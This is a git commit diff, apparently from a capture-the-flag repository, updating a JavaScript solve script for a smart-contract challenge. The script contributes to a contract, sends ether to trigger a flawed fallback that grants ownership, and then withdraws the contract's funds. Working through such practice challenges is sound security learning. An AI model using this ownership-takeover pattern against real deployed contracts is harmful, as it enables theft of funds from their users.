9b802a9b2068762ebc317f6132a41a76bb8b32ed
Emil Olesen <e-olesen@hotmail.com>
2023-05-17 19:27:19 +0200

    Added heroctf solve

--- 01/solve.js
+++ 01/solve.js
@@ -1,10 +1,10 @@
-await contract.contribute()
+await contract.contribute({value: 5})
 //To hit the fallback, call something non-existing
 web3.eth.sendTransaction({
     from: "0xD13Fc9225e1E6a56Dabb76Efd19e72BEdd8a8663",
     value: 1,
     gas: 100000,
-    to: "0x9873fC9BD8907dC9B6387b8e874374B972D033cE"
+    to: "0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB"
 })
 //the fallback method (recieve) will make you the owner if the value is above 0 and you've made previous contributions
 await contract.withdraw()
